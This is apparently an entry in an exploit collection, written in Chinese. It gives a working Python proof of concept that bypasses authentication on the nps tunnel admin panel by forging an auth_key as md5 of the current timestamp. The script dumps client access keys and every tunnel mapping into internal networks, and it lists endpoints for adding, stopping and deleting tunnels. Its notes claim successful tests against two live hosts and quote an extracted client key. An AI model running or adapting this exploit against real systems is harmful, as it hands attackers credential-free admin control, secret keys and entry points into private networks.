# nps web 管理端 auth_key=md5(timestamp) 认证绕过（含隧道/客户端清单导出）

- **code**: nps-authkey-md5-bypass
- **kind**: poc
- **category**: auth-bypass
- **component**: ehang nps (web 管理端)
- **severity**: critical
- **language**: python
- **source**: web
- **source_url**: https://raw.githubusercontent.com/ehang-io/nps/v0.26.10/web/controllers/index.go
- **verified**: 1
- **verified_note**: 203.0.113.119:8080 实测：未带签名 /index/index → 302 跳 /login/index；带伪造签名 /Index/Index → 200（26269B 后台首页）、GET/POST /client/list → 200（导出客户端 Id=2 Addr=203.0.113.113 VerifyKey=87ef7271f00a88c2）、POST /index/gettunnel type=tcp → 10 条隧道（31400-31409 → 10.8.0.2）；同 POC 在 203.0.113.121:8080 亦成立（200，26269B）。无需任何凭据。
- **path**: pocs/nps-authkey-md5-bypass/poc.py
- **tags**: nps,内网穿透,auth_key,认证绕过,内网入口
- **created_at**: 2026-09-28T06:47:20.087Z
- **found_by**: exploit

## 描述

nps 管理面板 auth_key=md5(timestamp) 认证绕过（无需口令进后台），随后导出 /client/list 客户端接入密钥与 /index/gettunnel 全部隧道映射，直取内网入口。

## 用法

```
替换 BASE 的 TARGET 为目标 nps 面板；python poc.py。前置：nps.conf 的 auth_key 处于注释状态（默认）。脚本会自动做 302/200 对照验证。
```

## 正文

```
# nps auth_key=md5(timestamp) 认证绕过 + 管理面导出
# 影响：nps.conf 中 auth_key 被注释（发行版默认）时成立，有效期 ~20s
# 验证：2026-09-28 在 203.0.113.119:8080 与 203.0.113.121:8080 两台实测成功
import time, hashlib, json
import requests
requests.packages.urllib3.disable_warnings()

BASE = "http://TARGET:8080"
S = requests.Session(); S.trust_env = False

def signed(path):
    now = int(time.time())
    key = hashlib.md5(str(now).encode()).hexdigest()
    sep = "&" if "?" in path else "?"
    return "%s%s%s%s" % (BASE, path, sep, "auth_key=%s&timestamp=%s" % (key, now))

def get(path):
    return S.get(signed(path), headers={"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest"},
                  timeout=15, verify=False, allow_redirects=False)

def post(path, data):
    return S.post(signed(path), data=data, headers={"User-Agent": "Mozilla/5.0",
                  "X-Requested-With": "XMLHttpRequest"}, timeout=15, verify=False, allow_redirects=False)

# 1) 判定：未带签名 302，带签名 200
assert get("/index/index").status_code == 302          # 对照组
assert get("/Index/Index").status_code == 200          # 绕过成功（26269B 后台首页）

# 2) 导出高价值管理面
print(post("/client/list", {"offset": 0, "limit": 50}).text)      # 客户端 vkey / Addr / 流量
for t in ("tcp", "udp", "httpProxy", "socks5", "secret", "file", "p2p"):
    r = post("/index/gettunnel", {"offset": 0, "limit": 100, "type": t, "client_id": "", "search": ""})
    print(t, r.text[:200])                                       # 隧道映射（往内网的真实入口）

# 3) 管理动作端点（谨慎：start/stop/del 会动目标在线业务）
#    /index/add  POST port=&server_ip=&type=&target=&local_proxy=&remark=&password=&local_path=&strip_pre=&client_id=
#    /index/edit /index/start /index/stop /index/del /index/addhost /index/edithost /index/delhost

```
